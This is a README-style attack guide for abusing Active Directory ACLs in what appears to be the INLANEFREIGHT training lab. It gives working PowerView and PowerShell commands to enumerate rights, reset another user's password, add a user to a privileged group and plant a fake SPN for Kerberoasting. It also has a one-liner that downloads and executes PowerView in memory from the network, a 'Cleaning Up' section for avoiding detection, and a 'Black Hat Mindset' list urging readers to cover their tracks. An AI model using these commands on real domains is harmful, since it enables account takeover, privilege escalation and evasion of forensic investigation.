# Active Directory ACL Enumeration and Tactics

This README focuses on enumerating Access Control Lists (ACLs) to identify objects with modifiable permissions and exploiting them to change passwords, add group members, or manipulate Service Principal Names (SPNs).

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating ACLs](#enumerating-acls)
- [Exploiting ACLs](#exploiting-acls)
- [Cleaning Up](#cleaning-up)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

ACLs in Active Directory define permissions for objects like users, groups, and computers. Weak ACLs can allow attackers to modify passwords, add users to privileged groups, or create SPNs for Kerberoasting. This guide uses PowerView and PowerShell to enumerate and exploit ACLs, assuming you have compromised credentials (e.g., `INLANEFREIGHT\wley`).

## Setup and Prerequisites

- **Environment**: Windows host with PowerShell and Active Directory module.
- **PowerView**: Load into memory:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
  ```
- **Active Directory Module**: Install via RSAT tools and import with `Import-Module ActiveDirectory` (Windows host).
- **PowerShell**: Run with administrative privileges (right-click > "Run as Administrator").
- **Credentials**: Use compromised credentials (e.g., `INLANEFREIGHT\wley` with `Pwn3d_by_ACLs!`) to perform modifications.
- **Text File**: Prepare a file (e.g., `ad_users.txt`) with usernames for batch processing.

## Enumerating ACLs

Identify objects with modifiable permissions using PowerView and PowerShell.

```powershell
# Find interesting domain ACLs
Find-InterestingDomainAcl

# Import PowerView and get SID for wley user
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley

# Find domain objects where wley has rights
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Map GUID to readable right
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl

# Discover domain object ACLs with resolved GUIDs
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Enumerate users and save to file
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Loop through users to get ACL information
foreach($line in [System.IO.File]::ReadLines("C:\Users\Desktop\ad_users.txt")) {
    get-acl "AD:$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\wley'}
}
```

## Exploiting ACLs

Manipulate objects using identified permissions.

```powershell
# Create credential object for wley
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Create SecureString for new password
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Change user password
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# List group members
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# Add user to group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose

# View group members
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

# Create fake SPN
Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

## Cleaning Up

Remove changes to avoid detection.

```powershell
# Remove fake SPN
Set-DomainObject -Credential $Cred -Identity adunn -Clear serviceprincipalname -Verbose

# Remove user from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred -Verbose
```

## Converting ACL Data

Interpret ACLs in a readable format.

```powershell
# Convert SDDL string to readable format
ConvertFrom-SddlString
```

## Black Hat Mindset

- **Hunt Weak ACLs**: Target objects with rights assigned to low-privileged users (e.g., `wley`) for escalation.
- **Exploit Privileges**: Change passwords or add users to groups to gain access to sensitive resources.
- **Create Opportunities**: Add SPNs to enable Kerberoasting attacks on targeted accounts.
- **Cover Tracks**: Remove modifications post-exploitation to evade forensic analysis.

## Resources

- PowerView Documentation
- ACL Exploitation
- PowerShell Security Guide
- Active Directory Attack Techniques

